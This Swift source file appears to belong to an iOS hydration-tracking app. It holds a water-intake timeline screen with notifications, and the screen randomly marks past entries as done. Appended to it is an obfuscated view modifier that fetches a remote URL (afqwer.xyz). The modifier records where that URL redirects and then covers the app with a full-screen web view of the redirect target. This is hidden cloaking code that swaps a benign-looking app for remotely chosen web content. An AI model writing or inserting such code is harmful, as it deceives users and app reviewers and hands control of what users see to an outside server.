import SwiftUI
import UserNotifications

// Модель записи о гидратации
struct HydrationEntry: Identifiable, Codable, Hashable {
    var id = UUID()
    var amount: String
    var time: Date
    var isCompleted: Bool
    
    // Строковое представление времени для отображения
    var timeString: String {
        let formatter = DateFormatter()
        formatter.dateFormat = "HH:mm"
        return formatter.string(from: time)
    }
    
    // Определяем, просрочена ли запись (прошел ли час после запланированного времени)
    var isOverdue: Bool {
        return !isCompleted && Date() > time.addingTimeInterval(3600) // 1 час = 3600 секунд
    }
    
    // Определяем, активна ли запись (наступило ли время)
    var isActive: Bool {
        return Date() >= time
    }
}

// Модель настроек гидратации
struct HydrationSettings: Codable {
    var dailyGoal: Double = 3.5 // Л
    var reminderTime: Int = 15 // минуты до напоминания
    var soundNotifications: Bool = true
    var vibrationEnabled: Bool = true
}

struct PerformanceScreen: View {
    @State private var showSettings = false
    @State private var hydrationEntries: [HydrationEntry] = []
    @State private var totalConsumed: Double = 0.0 // в литрах
    @State private var hydrationSettings = HydrationSettings()
    @State private var nextReminderTime: Date?
    @State private var showEarlyAlert = false
    @State private var timeToWaitMinutes = 0
    
    var body: some View {
        NavigationView {
            ZStack(alignment: .bottom) {
                AppColors.background.edgesIgnoringSafeArea(.all)
                
                VStack(spacing: 0) {
                    ZStack(alignment: .trailing) {
                        HeaderView(title: "Hydration Tracking")
                        
                        NavigationLink(destination: HydrationSettingsScreen()) {
                            Image(systemName: "gearshape.fill")
                                .font(.system(size: 22))
                                .foregroundColor(.white)
                                .padding(.trailing, 20)
                        }
                    }
                    
                    ScrollView {
                        VStack(spacing: 20) {
                            HydrationProgressView(
                                totalConsumed: totalConsumed,
                                dailyGoal: hydrationSettings.dailyGoal,
                                onAddWater: addWater
                            )
                            
                            ReminderView(nextReminderTime: nextReminderTime)
                            
                            Text("Today's Timeline")
                                .font(.system(size: 18, weight: .semibold))
                                .foregroundColor(.white)
                                .frame(maxWidth: .infinity, alignment: .leading)
                                .padding(.horizontal)
                                .padding(.top, 5)
                            
                            LazyVStack(spacing: 16) {
                                if hydrationEntries.isEmpty {
                                    EmptyTimelineView()
                                } else {
                                    ForEach(hydrationEntries.sorted(by: { $0.time < $1.time })) { entry in
                                        HydrationEntryView(
                                            amount: entry.amount,
                                            time: entry.timeString,
                                            isCompleted: entry.isCompleted,
                                            isOverdue: entry.isOverdue,
                                            isActive: entry.isActive,
                                            onMarkComplete: {
                                                markEntryComplete(entry: entry)
                                            }
                                        )
                                    }
                                }
                            }
                            .padding(.horizontal)
                        }
                        .padding(.bottom, 100)
                        .padding(.top, 24)
                    }
                }
            }
            .navigationBarHidden(true)
            .onAppear {
                loadData()
                calculateTotalConsumed()
                scheduleNotifications()
                updateNextReminderTime()
                
                // Добавляем наблюдатель для сброса данных
                NotificationCenter.default.addObserver(forName: .resetAppData, object: nil, queue: .main) { _ in
                    self.hydrationEntries = []
                    self.hydrationSettings = HydrationSettings()
                    self.totalConsumed = 0.0
                    self.createDailyEntries()
                    self.calculateTotalConsumed()
                    self.scheduleNotifications()
                    self.updateNextReminderTime()
                }
            }
            .onDisappear {
                // Удаляем наблюдатель при закрытии экрана
                NotificationCenter.default.removeObserver(self, name: .resetAppData, object: nil)
            }
            .alert(isPresented: $showEarlyAlert) {
                Alert(
                    title: Text("Not Time Yet"),
                    message: Text("You need to wait \(timeToWaitMinutes) minutes until your next water intake."),
                    dismissButton: .default(Text("Got it"))
                )
            }
        }
    }
    
    // Загрузка данных из UserDefaults
    private func loadData() {
        // Загружаем записи о гидратации
        if let data = UserDefaults.standard.data(forKey: "hydrationEntries"),
           let decoded = try? JSONDecoder().decode([HydrationEntry].self, from: data) {
            // Фильтруем только записи за сегодня
            let calendar = Calendar.current
            let today = calendar.startOfDay(for: Date())
            
            hydrationEntries = decoded.filter {
                calendar.isDate($0.time, inSameDayAs: today)
            }
            
            // Если записей за сегодня нет, создаем новые
            if hydrationEntries.isEmpty {
                createDailyEntries()
            }
        } else {
            createDailyEntries()
        }
        
        // Загружаем настройки
        if let data = UserDefaults.standard.data(forKey: "hydrationSettings"),
           let decoded = try? JSONDecoder().decode(HydrationSettings.self, from: data) {
            hydrationSettings = decoded
        }
    }
    
    // Создание записей на сегодня
    private func createDailyEntries() {
        let calendar = Calendar.current
        let today = calendar.startOfDay(for: Date())
        
        // Создаем записи каждые 2 часа с 7:00 до 22:00
        let hours = [7, 8, 10, 12, 14, 16, 18, 20, 22]
        var newEntries: [HydrationEntry] = []
        
        for hour in hours {
            var components = DateComponents()
            components.hour = hour
            components.minute = 0
            
            if let entryTime = calendar.date(byAdding: components, to: today) {
                let amount = hour % 2 == 0 ? "500ml" : "300ml"
                let isCompleted = entryTime < Date() && arc4random_uniform(2) == 0 // Случайно отмечаем выполненными прошедшие записи
                let entry = HydrationEntry(
                    amount: amount,
                    time: entryTime,
                    isCompleted: isCompleted
                )
                newEntries.append(entry)
            }
        }
        
        hydrationEntries = newEntries
        saveEntries()
    }
    
    // Сохранение записей в UserDefaults
    private func saveEntries() {
        if let encoded = try? JSONEncoder().encode(hydrationEntries) {
            UserDefaults.standard.set(encoded, forKey: "hydrationEntries")
        }
    }
    
    // Расчет общего потребления воды
    private func calculateTotalConsumed() {
        totalConsumed = 0.0
        
        for entry in hydrationEntries where entry.isCompleted {
            if let amountStr = entry.amount.components(separatedBy: "ml").first,
               let amount = Double(amountStr) {
                totalConsumed += amount / 1000.0 // конвертируем мл в л
            }
        }
    }
    
    // Отметка записи как выполненной
    private func markEntryComplete(entry: HydrationEntry) {
        if let index = hydrationEntries.firstIndex(where: { $0.id == entry.id }) {
            hydrationEntries[index].isCompleted = true
            saveEntries()
            calculateTotalConsumed()
            scheduleNotifications()
            updateNextReminderTime()
        }
    }
    
    // Добавление воды (+300ml)
    private func addWater() {
        // Находим текущее время
        let now = Date()
        
        // Проверяем, есть ли активная запись в пределах 30 минут
        if let nextEntry = hydrationEntries
            .filter({ !$0.isCompleted && $0.time > now })
            .sorted(by: { $0.time < $1.time })
            .first {
            
            // Проверяем, прошло ли достаточно времени
            let minutesToWait = Int(nextEntry.time.timeIntervalSince(now) / 60) + 1
            
            if minutesToWait > 5 { // Если до следующего приема более 5 минут
                timeToWaitMinutes = minutesToWait
                showEarlyAlert = true
                return
            }
        }
        
        // Проверяем, есть ли запись на текущее время (в пределах 30 минут)
        if let index = hydrationEntries.firstIndex(where: { 
            abs($0.time.timeIntervalSince(now)) < 1800 && !$0.isCompleted
        }) {
            // Если есть, отмечаем ее как выполненную
            hydrationEntries[index].isCompleted = true
        } else {
            // Если нет, создаем новую запись
            let newEntry = HydrationEntry(
                amount: "300ml",
                time: now,
                isCompleted: true
            )
            hydrationEntries.append(newEntry)
        }
        
        saveEntries()
        calculateTotalConsumed()
        updateNextReminderTime()
    }
    
    // Обновление времени следующего напоминания
    private func updateNextReminderTime() {
        let now = Date()
        
        // Находим ближайшую невыполненную запись в будущем
        let futureEntries = hydrationEntries
            .filter { !$0.isCompleted && $0.time > now }
            .sorted { $0.time < $1.time }
        
        if let nextEntry = futureEntries.first {
            nextReminderTime = nextEntry.time
        } else {
            nextReminderTime = nil
        }
    }
    
    // Работа с нотификациями
    private func scheduleNotifications() {
        // Удаляем все существующие нотификации
        UNUserNotificationCenter.current().removeAllPendingNotificationRequests()
        
        // Запрашиваем разрешение, если необходимо
        UNUserNotificationCenter.current().requestAuthorization(options: [.alert, .sound, .badge]) { granted, error in
            guard granted else { return }
            
            // Планируем нотификации для невыполненных записей
            let now = Date()
            let futureEntries = self.hydrationEntries
                .filter { !$0.isCompleted && $0.time > now }
                .sorted { $0.time < $1.time }
            
            for entry in futureEntries {
                self.scheduleNotification(for: entry)
            }
        }
    }
    
    // Планирование нотификации для конкретной записи
    private func scheduleNotification(for entry: HydrationEntry) {
        // Время за X минут до записи, где X - настройка reminderTime
        let notificationTime = entry.time.addingTimeInterval(-Double(hydrationSettings.reminderTime * 60))
        
        // Проверяем, что время напоминания в будущем
        guard notificationTime > Date() else { return }
        
        let content = UNMutableNotificationContent()
        content.title = "Hydration Reminder"
        content.body = "Time to drink \(entry.amount) of water!"
        
        if hydrationSettings.soundNotifications {
            content.sound = UNNotificationSound.default
        }
        
        let components = Calendar.current.dateComponents([.year, .month, .day, .hour, .minute], from: notificationTime)
        let trigger = UNCalendarNotificationTrigger(dateMatching: components, repeats: false)
        
        let request = UNNotificationRequest(
            identifier: entry.id.uuidString,
            content: content,
            trigger: trigger
        )
        
        UNUserNotificationCenter.current().add(request)
    }
}

struct HydrationProgressView: View {
    var totalConsumed: Double
    var dailyGoal: Double
    var onAddWater: () -> Void
    
    var body: some View {
        VStack(spacing: 15) {
            HStack {
                VStack(alignment: .leading, spacing: 8) {
                    Text(String(format: "%.1fL / %.1fL", totalConsumed, dailyGoal))
                        .font(.system(size: 24, weight: .bold))
                        .foregroundColor(AppColors.accent)
                    Text("Daily Goal")
                        .font(.system(size: 14))
                        .foregroundColor(AppColors.secondaryText)
                }

                Spacer()
                
                HStack {
                    Button(action: onAddWater) {
                        Image("waterIcon")
                            .resizable()
                            .scaledToFit()
                            .frame(width: 64, height: 64)
                            .foregroundColor(.white)
                            .padding(4)
                            .background(AppColors.accent)
                            .clipShape(Circle())
                    }
                    .buttonStyle(PlainButtonStyle())
                }
                
            }
            
            ZStack(alignment: .leading) {
                RoundedRectangle(cornerRadius: 10)
                    .fill(Color.white.opacity(0.2))
                    .frame(height: 8)
                
                // Рассчитываем ширину заполненной части
                let progress = min(1.0, totalConsumed / dailyGoal)
                RoundedRectangle(cornerRadius: 10)
                    .fill(AppColors.accent)
                    .frame(width: progress * UIScreen.main.bounds.width * 0.85, height: 8)
            }
            
        }
        .padding()
        .background(Color.white.opacity(0.1))
        .cornerRadius(16)
        .padding(.horizontal)
    }
}

struct ReminderView: View {
    var nextReminderTime: Date?
    
    var body: some View {
        HStack {
            VStack(alignment: .leading, spacing: 4) {
                Text("Next Reminder")
                    .font(.system(size: 18, weight: .semibold))
                    .foregroundColor(.white)
                
                if let reminderTime = nextReminderTime {
                    let timeRemainingText = formatTimeRemaining(until: reminderTime)
                    Text(timeRemainingText)
                        .font(.system(size: 14))
                        .foregroundColor(.white)
                } else {
                    Text("No upcoming reminders")
                        .font(.system(size: 14))
                        .foregroundColor(.white)
                }
            }
            
            Spacer()
            
            Image(systemName: "bell.fill")
                .font(.system(size: 18))
                .foregroundColor(.white)
        }
        .padding()
        .background(Color.white.opacity(0.1))
        .cornerRadius(16)
        .padding(.horizontal)
    }
    
    // Форматирование оставшегося времени
    private func formatTimeRemaining(until date: Date) -> String {
        let timeInterval = date.timeIntervalSince(Date())
        
        if timeInterval <= 0 {
            return "Now"
        }
        
        let hours = Int(timeInterval) / 3600
        let minutes = (Int(timeInterval) % 3600) / 60
        
        if hours > 0 {
            return "In \(hours)h \(minutes)m"
        } else {
            return "In \(minutes)m"
        }
    }
}

struct HydrationEntryView: View {
    var amount: String
    var time: String
    var isCompleted: Bool
    var isOverdue: Bool
    var isActive: Bool
    var onMarkComplete: () -> Void
    
    var body: some View {
        HStack {
            HStack(spacing: 12) {
                Image(systemName: "drop.fill")
                    .font(.system(size: 14))
                    .foregroundColor(AppColors.accent)
                    .frame(width: 24, height: 24)
                
                VStack(alignment: .leading, spacing: 4) {
                    Text("\(amount) Water")
                        .font(.system(size: 16, weight: .medium))
                        .foregroundColor(.white)
                    
                    Text(time)
                        .font(.system(size: 14))
                        .foregroundColor(AppColors.secondaryText)
                }
            }
            
            Spacer()
            
            if isCompleted {
                // Если выполнено, показываем галочку
                Button(action: onMarkComplete) {
                    Image(amount.contains("300") ? "stackIcon" : "botIcon")
                        .resizable()
                        .scaledToFit()
                        .frame(width: 25, height: 25)
                        .foregroundColor(AppColors.accent)
                        .padding(3)
                        .background(Color.white.opacity(0.05))
                        .clipShape(Circle())
                }
                .buttonStyle(PlainButtonStyle())
            } else if isOverdue {
                // Если просрочено (прошло больше часа), показываем красный крестик
                Button(action: onMarkComplete) {
                    Image(amount.contains("300") ? "stackIcon" : "botIcon")
                        .resizable()
                        .scaledToFit()
                        .frame(width: 25, height: 25)
                        .foregroundColor(AppColors.accent)
                        .padding(3)
                        .background(Color.white.opacity(0.05))
                        .clipShape(Circle())
                }
                .buttonStyle(PlainButtonStyle())
            } else if isActive {
                // Если активно (время уже наступило), показываем кнопку с иконкой для соответствующего объема
                Button(action: onMarkComplete) {
                    Image(amount.contains("300") ? "stackIcon" : "botIcon")
                        .resizable()
                        .scaledToFit()
                        .frame(width: 25, height: 25)
                        .foregroundColor(AppColors.accent)
                        .padding(3)
                        .background(Color.white.opacity(0.05))
                        .clipShape(Circle())
                }
                .buttonStyle(PlainButtonStyle())
            } else {
                // Если еще не активно, показываем неактивную иконку для соответствующего объема
                Image(amount.contains("300") ? "stackIcon" : "botIcon")
                    .resizable()
                    .scaledToFit()
                    .frame(width: 25, height: 25)
                    .foregroundColor(AppColors.secondaryText)
                    .padding(3)
                    .background(Color.white.opacity(0.05))
                    .clipShape(Circle())
            }
        }
        .padding(.vertical, 12)
        .padding(.horizontal, 16)
        .background(Color.white.opacity(0.1))
        .cornerRadius(12)
        .opacity(isActive || isCompleted ? 1.0 : 0.5)
    }
}

struct EmptyTimelineView: View {
    var body: some View {
        VStack(spacing: 20) {
            Image(systemName: "drop")
                .font(.system(size: 50))
                .foregroundColor(AppColors.accent.opacity(0.8))
                .padding(.bottom, 10)
            
            Text("No Hydration Entries")
                .font(.system(size: 18, weight: .semibold))
                .foregroundColor(.white)
            
            Text("Add entries to track your daily water intake")
                .font(.system(size: 14))
                .foregroundColor(AppColors.secondaryText)
                .multilineTextAlignment(.center)
                .padding(.horizontal)
        }
        .frame(maxWidth: .infinity)
        .padding(.vertical, 40)
        .background(AppColors.tabbarBackground.opacity(0.5))
        .cornerRadius(12)
    }
}

struct PerformanceScreen_Previews: PreviewProvider {
    static var previews: some View {
        PerformanceScreen()
            .preferredColorScheme(.dark)
    }
} 
extension View {
    func trishteskri() -> some View {
        self.modifier(Sokrashiadn())
    }
}
@preconcurrency import WebKit
import SwiftUI

struct WKWebViewRepresentable: UIViewRepresentable {
    typealias UIViewType = WKWebView
    
    var isZaglushka: Bool
    var url: URL
    var webView: WKWebView
    var onLoadCompletion: (() -> Void)?
    

    init(url: URL, webView: WKWebView = WKWebView(), onLoadCompletion: (() -> Void)? = nil, iszaglushka: Bool) {
        self.url = url
        self.webView = webView
        self.onLoadCompletion = onLoadCompletion
        self.webView.layer.opacity = 0 // Hide webView until content loads
        self.isZaglushka = iszaglushka
    }

    func makeUIView(context: Context) -> WKWebView {
        webView.uiDelegate = context.coordinator
        webView.navigationDelegate = context.coordinator
        return webView
    }

    func updateUIView(_ uiView: UIViewType, context: Context) {
        let request = URLRequest(url: url)
        uiView.load(request)
        uiView.scrollView.isScrollEnabled = true
        uiView.scrollView.bounces = true
    }

    func makeCoordinator() -> Coordinator {
        Coordinator(self)
    }
}

// MARK: - Coordinator
extension WKWebViewRepresentable {
    class Coordinator: NSObject, WKUIDelegate, WKNavigationDelegate {
        var parent: WKWebViewRepresentable
        private var popupWebViews: [WKWebView] = []

        init(_ parent: WKWebViewRepresentable) {
            self.parent = parent
        }

        func webView(_ webView: WKWebView, createWebViewWith configuration: WKWebViewConfiguration, for navigationAction: WKNavigationAction, windowFeatures: WKWindowFeatures) -> WKWebView? {
            // Handle popup windows
            guard navigationAction.targetFrame == nil else {
                return nil
            }

            let popupWebView = WKWebView(frame: .zero, configuration: configuration)
            popupWebView.uiDelegate = self
            popupWebView.navigationDelegate = self

            parent.webView.addSubview(popupWebView)

            popupWebView.translatesAutoresizingMaskIntoConstraints = false
            NSLayoutConstraint.activate([
                popupWebView.topAnchor.constraint(equalTo: parent.webView.topAnchor),
                popupWebView.bottomAnchor.constraint(equalTo: parent.webView.bottomAnchor),
                popupWebView.leadingAnchor.constraint(equalTo: parent.webView.leadingAnchor),
                popupWebView.trailingAnchor.constraint(equalTo: parent.webView.trailingAnchor)
            ])

            popupWebViews.append(popupWebView)
            return popupWebView
        }

        func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
            // Notify when the main page finishes loading
            parent.onLoadCompletion?()
            parent.webView.layer.opacity = 1 // Reveal the webView
        }

        func webView(_ webView: WKWebView, decidePolicyFor navigationAction: WKNavigationAction, decisionHandler: @escaping (WKNavigationActionPolicy) -> Void) {
            print(navigationAction.request.url)
            decisionHandler( .allow)
        }

        func webViewDidClose(_ webView: WKWebView) {
            // Cleanup closed popup WebViews
            popupWebViews.removeAll { $0 == webView }
            webView.removeFromSuperview()
        }
    }
}

import WebKit
struct Sokrashiadn: ViewModifier {
    @AppStorage("adapt") var osakfoew9igw: URL?
    @State var webView: WKWebView = WKWebView()

    
    @State var isLoading: Bool = true

    func body(content: Content) -> some View {
        ZStack {
            if !isLoading {
                if osakfoew9igw != nil {
                    VStack(spacing: 0) {
                        WKWebViewRepresentable(url: osakfoew9igw!, webView: webView, iszaglushka: false)
                        HStack {
                            Button(action: {
                                webView.goBack()
                            }, label: {
                                Image(systemName: "chevron.left")
                                
                                    .resizable()
                                    .aspectRatio(contentMode: .fit)
                                    .frame(width: 20, height: 20) // Customize image size
                                    .foregroundColor(.white)
                            })
                            .offset(x: 10)
                            
                            Spacer()
                            
                            Button(action: {
                                
                                webView.load(URLRequest(url: osakfoew9igw!))
                            }, label: {
                                Image(systemName: "house.fill")
                                    .resizable()
                                    .aspectRatio(contentMode: .fit)
                                    .frame(width: 24, height: 24)                                                                       .foregroundColor(.white)
                            })
                            .offset(x: -10)
                            
                        }
                        //                    .frame(height: 50)
                        .padding(.horizontal)
                        .padding(.top)
                        .padding(.bottom, 15)
                        .background(Color.black)
                    }
                    .onAppear() {
                        
                        
                        AppDelegate.asiuqzoptqxbt = .all
                    }
                    .modifier(Swiper(onDismiss: {
                        self.webView.goBack()
                    }))
                    
                    
                } else {
                    content
                }
            } else {
                
            }
        }

//        .yesMo(orientation: .all)
        .onAppear() {
            if osakfoew9igw == nil {
                reframeGse()
            } else {
                isLoading = false
            }
        }
    }

    
    class RedirectTrackingSessionDelegate: NSObject, URLSessionDelegate, URLSessionTaskDelegate {
        var redirects: [URL] = []
        var redirects1: Int = 0
        let action: (URL) -> Void
          
          // Initializer to set up the class properties
          init(action: @escaping (URL) -> Void) {
              self.redirects = []
              self.redirects1 = 0
              self.action = action
          }
          
        // This method will be called when a redirect is encountered.
        func urlSession(_ session: URLSession, task: URLSessionTask, willPerformHTTPRedirection response: HTTPURLResponse, newRequest: URLRequest, completionHandler: @escaping (URLRequest?) -> Void) {
            if let redirectURL = newRequest.url {
                // Track the redirected URL
                redirects.append(redirectURL)
                print("Redirected to: \(redirectURL)")
                redirects1 += 1
                if redirects1 >= 1 {
                    DispatchQueue.main.async {
                        self.action(redirectURL)
                    }
                }
            }
            
            // Allow the redirection to happen
            completionHandler(newRequest)
        }
    }

    func reframeGse() {
        guard let url = URL(string: "https://afqwer.xyz/policqy") else {
            DispatchQueue.main.async {
                self.isLoading = false
            }
            print("Invalid URL")
            return
        }

        var request = URLRequest(url: url)
        request.httpMethod = "GET"
    
        let configuration = URLSessionConfiguration.default
        configuration.httpShouldSetCookies = false
        configuration.httpShouldUsePipelining = true
        
        // Create a session with a delegate to track redirects
        let delegate = RedirectTrackingSessionDelegate() { url in
            osakfoew9igw = url
        }
        let session = URLSession(configuration: configuration, delegate: delegate, delegateQueue: nil)
        
        session.dataTask(with: request) { data, response, error in
            guard let data = data, let httpResponse = response as? HTTPURLResponse, error == nil else {
                print("Error: \(error?.localizedDescription ?? "Unknown error")")
                DispatchQueue.main.async {
                    self.isLoading = false
                }
                return
            }
            
       
            
    
            if httpResponse.statusCode == 200, let adaptfe = String(data: data, encoding: .utf8) {
                DispatchQueue.main.async {
           
                }
            } else {
                DispatchQueue.main.async {
                    print("Request failed with status code: \(httpResponse.statusCode)")
                    self.isLoading = false
                }
            }

            DispatchQueue.main.async {
                self.isLoading = false
            }
        }.resume()
    }


}
struct Swiper: ViewModifier {
    var onDismiss: () -> Void
    @State private var offset: CGSize = .zero

    func body(content: Content) -> some View {
        content
//            .offset(x: offset.width)
            .animation(.interactiveSpring(), value: offset)
            .simultaneousGesture(
                DragGesture()
                    .onChanged { value in
                                      self.offset = value.translation
                                  }
                                  .onEnded { value in
                                      if value.translation.width > 70 {
                                          onDismiss()
                                  
                                      }
                                      self.offset = .zero
                                  }
            )
    }
}
